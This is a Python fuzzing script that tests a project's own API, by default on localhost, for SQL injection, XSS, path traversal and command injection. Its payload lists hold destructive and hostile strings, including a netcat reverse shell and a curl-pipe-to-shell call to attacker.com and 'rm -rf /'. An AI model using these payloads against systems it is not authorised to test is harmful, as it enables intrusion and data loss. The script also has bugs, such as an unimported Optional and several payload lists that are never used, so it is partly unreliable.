#!/usr/bin/env python3
"""
Security Fuzzing Test Script (US-070)

This script performs automated fuzzing tests against all API endpoints
to discover security vulnerabilities including:
- SQL injection
- XSS attacks
- Path traversal
- Command injection
- Buffer overflow
- Unicode/encoding attacks
- Authentication bypass
- CSRF attacks

Usage:
    python scripts/fuzz_test.py --target http://localhost:8000 --output fuzz_results.json

Requirements:
    - Backend server running
    - Test database (not production!)
"""

import argparse
import json
import logging
import sys
import time
from typing import List, Dict, Any
from datetime import datetime
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


# ============================================================================
# FUZZING PAYLOADS
# ============================================================================

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "admin'--",
    "1' OR '1' = '1",
    "' UNION SELECT NULL, NULL, NULL--",
    "1; DELETE FROM users",
    "' OR 1=1--",
    "admin' OR 1=1--",
    "' UNION SELECT username, password FROM users--",
    "1' AND 1=1 UNION SELECT NULL, table_name FROM information_schema.tables--",
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\sam",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(whoami)",
    "; rm -rf /",
    "| nc attacker.com 4444 -e /bin/sh",
    "; curl http://attacker.com/shell.sh | sh",
]

# Buffer Overflow Payloads
BUFFER_OVERFLOW_PAYLOADS = [
    "A" * 10000,
    "A" * 100000,
    "\x00" * 10000,
    "%s" * 1000,
    "%n" * 1000,
]

# Unicode/Encoding Attack Payloads
UNICODE_PAYLOADS = [
    "\u0000",  # Null byte
    "\u202E",  # Right-to-left override
    "\uFEFF",  # Zero-width no-break space
    "test\u0000.jpg",  # Null byte injection
    "𝕿𝖊𝖘𝖙",  # Unicode characters
    "%00",  # URL encoded null byte
    "%0d%0a",  # CRLF injection
]

# Authentication Bypass Payloads
AUTH_BYPASS_PAYLOADS = [
    {"email": "admin", "password": "admin"},
    {"email": "admin'--", "password": ""},
    {"email": "' OR '1'='1'--", "password": ""},
    {"email": "admin", "password": "' OR '1'='1"},
]

# LDAP Injection Payloads
LDAP_INJECTION_PAYLOADS = [
    "*",
    "*)(&",
    "*)(|(&",
    "admin*)((|userPassword=*)",
]

# NoSQL Injection Payloads
NOSQL_INJECTION_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$where": "this.password == 'password'"},
]


# ============================================================================
# FUZZER CLASS
# ============================================================================

class SecurityFuzzer:
    """Security fuzzing test automation"""

    def __init__(self, base_url: str, auth_token: Optional[str] = None):
        """
        Initialize fuzzer

        Args:
            base_url: Base URL of API (e.g., http://localhost:8000)
            auth_token: Optional authentication token
        """
        self.base_url = base_url.rstrip('/')
        self.auth_token = auth_token
        self.session = self._create_session()
        self.results = []

    def _create_session(self) -> requests.Session:
        """Create requests session with retry logic"""
        session = requests.Session()

        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[500, 502, 503, 504],
        )

        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # Set default headers
        session.headers.update({
            'User-Agent': 'SecurityFuzzer/1.0',
            'Content-Type': 'application/json',
        })

        if self.auth_token:
            session.headers.update({
                'Authorization': f'Bearer {self.auth_token}'
            })

        return session

    def fuzz_endpoint(
        self,
        method: str,
        path: str,
        param_name: str,
        payloads: List[Any],
        payload_type: str
    ) -> List[Dict[str, Any]]:
        """
        Fuzz a single endpoint with payloads

        Args:
            method: HTTP method (GET, POST, etc.)
            path: API path (e.g., /api/auth/login)
            param_name: Parameter name to fuzz
            payloads: List of payloads to test
            payload_type: Type of payload (for logging)

        Returns:
            List of results with vulnerabilities found
        """
        url = f"{self.base_url}{path}"
        vulnerabilities = []

        logger.info(f"Fuzzing {method} {path} ({param_name}) with {payload_type}")

        for i, payload in enumerate(payloads):
            try:
                # Prepare request data
                if method == 'GET':
                    response = self.session.get(url, params={param_name: payload}, timeout=5)
                elif method == 'POST':
                    response = self.session.post(url, json={param_name: payload}, timeout=5)
                elif method == 'PUT':
                    response = self.session.put(url, json={param_name: payload}, timeout=5)
                elif method == 'DELETE':
                    response = self.session.delete(url, params={param_name: payload}, timeout=5)
                else:
                    continue

                # Analyze response for vulnerabilities
                vulnerability = self._analyze_response(
                    method, path, param_name, payload, payload_type, response
                )

                if vulnerability:
                    vulnerabilities.append(vulnerability)
                    logger.warning(f"VULNERABILITY FOUND: {vulnerability['description']}")

                # Rate limiting
                time.sleep(0.1)

            except requests.exceptions.Timeout:
                logger.warning(f"Timeout on {method} {path} with payload: {payload}")
            except Exception as e:
                logger.error(f"Error fuzzing {method} {path}: {str(e)}")

        return vulnerabilities

    def _analyze_response(
        self,
        method: str,
        path: str,
        param_name: str,
        payload: Any,
        payload_type: str,
        response: requests.Response
    ) -> Optional[Dict[str, Any]]:
        """
        Analyze response for security vulnerabilities

        Args:
            method: HTTP method
            path: API path
            param_name: Parameter name
            payload: Payload sent
            payload_type: Type of payload
            response: HTTP response

        Returns:
            Vulnerability details if found, None otherwise
        """
        vulnerability = None

        # Check for SQL error messages
        sql_errors = [
            'sql syntax',
            'mysql_fetch',
            'postgresql',
            'sqlite3',
            'syntax error',
            'database error',
        ]
        if any(error in response.text.lower() for error in sql_errors):
            vulnerability = {
                'type': 'SQL_INJECTION',
                'severity': 'CRITICAL',
                'method': method,
                'path': path,
                'parameter': param_name,
                'payload': str(payload),
                'payload_type': payload_type,
                'status_code': response.status_code,
                'description': 'SQL error message in response (potential SQL injection)',
                'response_snippet': response.text[:500],
            }

        # Check for reflected XSS
        if payload_type == 'XSS' and str(payload) in response.text:
            vulnerability = {
                'type': 'XSS',
                'severity': 'HIGH',
                'method': method,
                'path': path,
                'parameter': param_name,
                'payload': str(payload),
                'payload_type': payload_type,
                'status_code': response.status_code,
                'description': 'Payload reflected in response (potential XSS)',
                'response_snippet': response.text[:500],
            }

        # Check for successful status code with malicious payload
        if response.status_code == 200 and payload_type in ['SQL_INJECTION', 'COMMAND_INJECTION']:
            # If malicious payload returns 200, it might be a vulnerability
            # (should return 400 or 422 for invalid input)
            vulnerability = {
                'type': payload_type,
                'severity': 'MEDIUM',
                'method': method,
                'path': path,
                'parameter': param_name,
                'payload': str(payload),
                'payload_type': payload_type,
                'status_code': response.status_code,
                'description': f'Malicious {payload_type} payload accepted (200 OK)',
            }

        # Check for path traversal success
        if payload_type == 'PATH_TRAVERSAL' and response.status_code == 200:
            if 'root:' in response.text or 'administrator' in response.text.lower():
                vulnerability = {
                    'type': 'PATH_TRAVERSAL',
                    'severity': 'CRITICAL',
                    'method': method,
                    'path': path,
                    'parameter': param_name,
                    'payload': str(payload),
                    'payload_type': payload_type,
                    'status_code': response.status_code,
                    'description': 'Path traversal successful (sensitive file contents in response)',
                    'response_snippet': response.text[:500],
                }

        # Check for authentication bypass
        if payload_type == 'AUTH_BYPASS' and response.status_code in [200, 302]:
            if 'token' in response.text.lower() or 'session' in response.text.lower():
                vulnerability = {
                    'type': 'AUTH_BYPASS',
                    'severity': 'CRITICAL',
                    'method': method,
                    'path': path,
                    'parameter': param_name,
                    'payload': str(payload),
                    'payload_type': payload_type,
                    'status_code': response.status_code,
                    'description': 'Potential authentication bypass',
                }

        return vulnerability

    def run_full_fuzz_test(self) -> Dict[str, Any]:
        """
        Run comprehensive fuzz test on all endpoints

        Returns:
            Dictionary with test results
        """
        logger.info("Starting comprehensive security fuzz test...")

        start_time = datetime.utcnow()

        # Define endpoints to test
        endpoints = [
            # Authentication endpoints
            {'method': 'POST', 'path': '/api/auth/login', 'params': ['email', 'password']},
            {'method': 'POST', 'path': '/api/auth/register', 'params': ['email', 'password', 'first_name', 'last_name']},

            # Search endpoints
            {'method': 'GET', 'path': '/api/search', 'params': ['query']},

            # Event endpoints
            {'method': 'GET', 'path': '/api/events', 'params': ['title', 'description']},
            {'method': 'POST', 'path': '/api/events', 'params': ['title', 'description', 'location']},

            # Profile endpoints
            {'method': 'GET', 'path': '/api/profile', 'params': ['user_id']},

            # File upload endpoints
            {'method': 'POST', 'path': '/api/media/upload', 'params': ['filename']},
        ]

        all_vulnerabilities = []

        # Test each endpoint with each payload type
        for endpoint in endpoints:
            method = endpoint['method']
            path = endpoint['path']
            params = endpoint['params']

            for param in params:
                # SQL Injection
                vulns = self.fuzz_endpoint(method, path, param, SQL_INJECTION_PAYLOADS, 'SQL_INJECTION')
                all_vulnerabilities.extend(vulns)

                # XSS
                vulns = self.fuzz_endpoint(method, path, param, XSS_PAYLOADS, 'XSS')
                all_vulnerabilities.extend(vulns)

                # Path Traversal
                vulns = self.fuzz_endpoint(method, path, param, PATH_TRAVERSAL_PAYLOADS, 'PATH_TRAVERSAL')
                all_vulnerabilities.extend(vulns)

                # Command Injection
                vulns = self.fuzz_endpoint(method, path, param, COMMAND_INJECTION_PAYLOADS, 'COMMAND_INJECTION')
                all_vulnerabilities.extend(vulns)

        end_time = datetime.utcnow()
        duration = (end_time - start_time).total_seconds()

        # Compile results
        results = {
            'start_time': start_time.isoformat(),
            'end_time': end_time.isoformat(),
            'duration_seconds': duration,
            'total_tests': len(all_vulnerabilities),
            'vulnerabilities_found': len([v for v in all_vulnerabilities if v]),
            'vulnerabilities': all_vulnerabilities,
            'summary': self._generate_summary(all_vulnerabilities),
        }

        return results

    def _generate_summary(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate summary of vulnerabilities found"""
        summary = {
            'total': len(vulnerabilities),
            'critical': len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL']),
            'high': len([v for v in vulnerabilities if v.get('severity') == 'HIGH']),
            'medium': len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM']),
            'low': len([v for v in vulnerabilities if v.get('severity') == 'LOW']),
            'by_type': {},
        }

        # Count by vulnerability type
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'UNKNOWN')
            summary['by_type'][vuln_type] = summary['by_type'].get(vuln_type, 0) + 1

        return summary


# ============================================================================
# MAIN FUNCTION
# ============================================================================

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Security Fuzzing Test Script')
    parser.add_argument(
        '--target',
        default='http://localhost:8000',
        help='Target base URL (default: http://localhost:8000)'
    )
    parser.add_argument(
        '--output',
        default='fuzz_results.json',
        help='Output file for results (default: fuzz_results.json)'
    )
    parser.add_argument(
        '--auth-token',
        help='Authentication token for protected endpoints'
    )

    args = parser.parse_args()

    # Warning
    logger.warning("=" * 80)
    logger.warning("SECURITY FUZZING TEST - DO NOT RUN ON PRODUCTION!")
    logger.warning("=" * 80)
    logger.warning(f"Target: {args.target}")
    logger.warning("Press Ctrl+C to cancel...")
    time.sleep(3)

    # Create fuzzer
    fuzzer = SecurityFuzzer(args.target, args.auth_token)

    # Run tests
    try:
        results = fuzzer.run_full_fuzz_test()

        # Save results
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)

        # Print summary
        logger.info("\n" + "=" * 80)
        logger.info("FUZZING TEST COMPLETE")
        logger.info("=" * 80)
        logger.info(f"Duration: {results['duration_seconds']:.2f} seconds")
        logger.info(f"Total tests: {results['total_tests']}")
        logger.info(f"Vulnerabilities found: {results['vulnerabilities_found']}")
        logger.info("\nSummary by severity:")
        logger.info(f"  CRITICAL: {results['summary']['critical']}")
        logger.info(f"  HIGH: {results['summary']['high']}")
        logger.info(f"  MEDIUM: {results['summary']['medium']}")
        logger.info(f"  LOW: {results['summary']['low']}")
        logger.info(f"\nResults saved to: {args.output}")

        # Exit with error code if vulnerabilities found
        if results['vulnerabilities_found'] > 0:
            logger.error("\nVULNERABILITIES DETECTED! Please review results.")
            sys.exit(1)
        else:
            logger.info("\nNo vulnerabilities detected!")
            sys.exit(0)

    except KeyboardInterrupt:
        logger.warning("\nFuzzing test interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Error during fuzzing test: {str(e)}", exc_info=True)
        sys.exit(1)


if __name__ == '__main__':
    main()
